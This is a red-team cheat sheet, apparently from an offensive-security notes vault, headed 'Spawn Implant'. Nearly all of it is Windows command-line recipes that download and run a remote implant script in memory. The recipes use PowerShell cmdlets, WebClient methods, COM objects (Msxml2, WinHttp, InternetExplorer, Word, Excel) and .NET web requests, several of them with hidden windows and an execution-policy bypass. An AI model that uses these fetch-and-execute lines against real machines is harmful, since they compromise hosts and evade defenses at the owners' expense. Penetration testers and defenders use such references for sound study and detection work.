---
author(s):
  - Userware
tags:
  - post-exploitation
  - file-transfer-and-data-exfiltration
  - living-off-the-land
  - windows
---
# Spawn Implant

## 01 - Command Prompt

System32 is for 32-bit powershell payloads

```
C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://<IP>/implant.ps1')"
```

SysWOW64 is for 64-bit powershell payloads

```
C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://<IP>/shell.ps1')"
```

## 02 - PowerShell

### 2.1 - Cmdlets

#### 2.1.1 - `Invoke-RestMethod`

```
PS C:\> IEX (Invoke-RestMethod "http[s]://<IP>[:<PORT>]/implant.ps1)
```

#### 2.1.2 - `Invoke-WebRequest`

```
PS C:\> Invoke-WebRequest http[s]://<IP>[:<PORT>]/implant.ps1 | iex
```

Internet Explorer backwards compatibility.

```
PS C:\> Invoke-WebRequest https[s]://<IP>[:<PORT>]/implant.ps1 -UseBasicParsing | IEX
```

### 2.2 - PowerShell Objects

#### 2.1.1 - `DownloadString`

```
PS C:\> iex (New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1')
```

#### 2.1.2 - `DownloadData`

```powershell
PS C:\> $data = (New-Object Net.WebClient).DownloadData('http[s]://<IP>[:<PORT>]/implant.ps1'); $implant = [System.Text.Encoding]::ASCII.GetString($data); IEX $implant
```

#### 2.1.3 - `OpenRead`

```powershell
PS C:\> IEX (New-Object System.IO.StreamReader ((New-Object Net.Webclient).OpenRead('http[s]://<IP>:<PORT>/implant.ps1'))).ReadToEnd()

PS C:\> $read = (New-Object Net.Webclient).OpenRead('http[s]://<IP>[:<PORT>]/implant.ps1'); $reader = New-Object System.IO.StreamReader $read; $implant = $reader.ReadToEnd(); IEX $implant
```

#### 2.1.4 - `XmlDocument`

An XML file.

```xml
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>PS C:\> IEX ([System.Text.Encoding]::Unicode.GetString(([Convert]::FromBase64String('<base64_encoded>'))))</execute>
   </a>
  </command>
#>
```

How to execute it.

```powershell
PS C:\> $xmldata = New-Object System.Xml.XmlDocument; $xmldata.Load('http[s]://<IP>[:<PORT>]/implant.xml'); IEX ($xmldata.command.a.execute)
```

### 2.3 - COM Objects

#### 2.3.1 - `Msxml2.XMLHTTP`

```powershell
PS C:\> $http = New-Object -ComObject Msxml2.XMLHTTP; $http.open('GET', 'http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText

PS C:\> $http = [activator]::CreateInstance([type]::GetTypeFromCLSID('F6D90F16-9C73-11D3-B32E-00C04F990BB4')); $http.open('GET', 'http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText
```

#### 2.3.2 - `Msxml2.XMLHTTP.3.0`

```powershell
PS C:\> $http = New-Object -ComObject Msxml2.XMLHTTP.3.0; $http.open('GET', 'http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText

PS C:\> $http = [activator]::CreateInstance([type]::GetTypeFromCLSID('F5078F35-C551-11D3-89B9-0000F81FE221')); $http.open('GET', 'http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText
```

#### 2.3.3 - `Msxml2.XMLHTTP.6.0`

```powershell
PS C:\> $http = New-Object -ComObject Msxml2.XMLHTTP.6.0; $http.open('GET', 'http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText

PS C:\> $http = [activator]::CreateInstance([type]::GetTypeFromCLSID('88d96a0a-f192-11d4-a65f-0040963251e5')); $http.open('GET', 'http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText
```

#### 2.3.4 - `InternetExplorer.Application`

```powershell
PS C:\> $iexplorer = New-Object -ComObject InternetExplorer.Application; $iexplorer.visible = $False; $iexplorer.navigate('http[s]://<IP>[:<PORT>]/implant.ps1'); Start-Sleep 5; $response = $iexplorer.Document.body.innerHTML; $iexplorer.quit(); IEX $response

$iexplorer = [activator]::CreateInstance([type]::GetTypeFromCLSID('0002DF01-0000-0000-C000-000000000046')); $iexplorer.visible = $False; $iexplorer.navigate('http[s]://<IP>[:<PORT>]/implant.ps1'); Start-Sleep 5; $response = $iexplorer.Document.body.innerHTML; $iexplorer.quit(); IEX $response
```

#### 2.3.5 - `WinHttp` (not proxy aware)

```powershell
PS C:\> $http = New-Object -ComObject WinHttp.WinHttpRequest.5.1; $http.open('GET','http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText

PS C:\> $http = [activator]::CreateInstance([type]::GetTypeFromCLSID('2087c2f4-2cef-4953-a8ab-66779b670495')); $http.open('GET', 'http[s]://<IP>[:<PORT>]/implant.ps1', $false); $http.send(); IEX $http.responseText
```

#### 2.3.6 - `Word.Application`

```powershell
PS C:\> $DCOMWord = New-Object -ComObject Word.Application; While($DCOMWord.Busy) { Start-Sleep -Seconds 1 } $DCOMWord.Visible = $False; $document = $DCOMWord.Documents.Open('http[s]://<IP>[:<PORT>]/implant.ps1'); While($DCOMWord.Busy) { Start-Sleep -Seconds 1 } IEX $document.Content.Text; $DCOMWord.Quit(); [Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($DCOMWord)

PS C:\> $DCOMWord = [activator]::CreateInstance([type]::GetTypeFromCLSID('000209FF-0000-0000-C000-000000000046')); While($DCOMWord.Busy) { Start-Sleep -Seconds 1 } $DCOMWord.Visible = $False; $document = $DCOMWord.Documents.Open('http[s]://<IP>[:<PORT>]/implant.ps1'); While($DCOMWord.Busy) { Start-Sleep -Seconds 1 } IEX $document.Content.Text; $DCOMWord.Quit(); [Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($DCOMWord)
```

#### 2.3.7 - `Excel.Application`

```powershell
PS C:\> $DCOMExcel = New-Object -ComObject Excel.Application; While($DCOMExcel.Busy) { Start-Sleep -Seconds 1 } $DCOMExcel.DisplayAlerts=$False; $Null = $DCOMExcel.Workbooks.Open('http[s]://<IP>[:<PORT>]/implant.ps1'); While($DCOMExcel.Busy) { Start-Sleep -Seconds 1 } IEX (($DCOMExcel.Sheets.Item(1).Range("A1:N"+$DCOMExcel.Sheets.Item(1).UsedRange.Rows.Count).Value2|?{(Variable _).Value})-Join"`n"); $DCOMExcel.Quit(); [Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($DCOMExcel)
```

### 2.4 - .NET

#### 2.4.1 - `WebRequest`

```powershell
PS C:\> $webrequest = [System.Net.WebRequest]::Create('http[s]://<IP>[:<PORT>]/implant.ps1'); $response = $webrequest.GetResponse(); $responsestream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader $responsestream; $implant = $reader.ReadToEnd(); IEX $implant
```

#### 2.4.2 - `HttpWebRequest`

```powershell
PS C:\> $httpwebrequest = [System.Net.HttpWebRequest]::Create('http[s]://<IP>[:<PORT>]/implant.ps1'); $response = $httpwebrequest.GetResponse(); $responsestream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader $responsestream; $implant = $reader.ReadToEnd(); IEX $implant
```

#### 2.4.3 - `FileWebRequest`

```powershell
PS C:\> $filewebrequest = [System.Net.FileWebRequest]::Create('http[s]://<IP>[:<PORT>]/implant.ps1'); $response = $filewebrequest.GetResponse(); $responsestream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader $responsestream; $implant = $reader.ReadToEnd(); IEX $implant
```

#### 2.4.4 - `FtpWebRequest`

```powershell
PS C:\> $ftpwebrequest = [System.Net.FtpWebRequest]::Create('http[s]://<IP>[:<PORT>]/implant.ps1'); $response = $ftpwebrequest.GetResponse(); $responsestream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader $responsestream; $output = $reader.ReadToEnd(); IEX $output
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Windows/Host/0xG - Processes AND Services AND Software/Discover Programs/Manual/Living off the Land|Living off the Land: Discover Programs]]

- [[Web Delivery|Metasploit: Web Drive-by]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Linux/Network Protocols/SMB|File Transfer and Data Exfiltration: Samba]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Windows/Network Protocols/SMB|File Transfer and Data Exfiltration: Windows SMB]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Linux/Network Protocols/WebDAV|File Transfer and Data Exfiltration: Linux WebDAV]]

- [[4shared]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/04 - Security Endpoints/Windows/Microsoft/Applocker/CSC/C2 Frameworks|Applocker Defense Evasion: Metasploit]]

## Hacktricks

- [Hacktricks: Shells - Windows](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/windows.html)

### Hacking Articles

- [Hacking Articles: Windows Exploitation MSBuild](https://www.hackingarticles.in/windows-exploitation-msbuild/)

### Red Team Notes

- [Red Team Notes: Using MSBuild to Execute Shellcode in C#](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)

### SS64

- [SS64: Powershell](https://ss64.com/ps/powershell.html)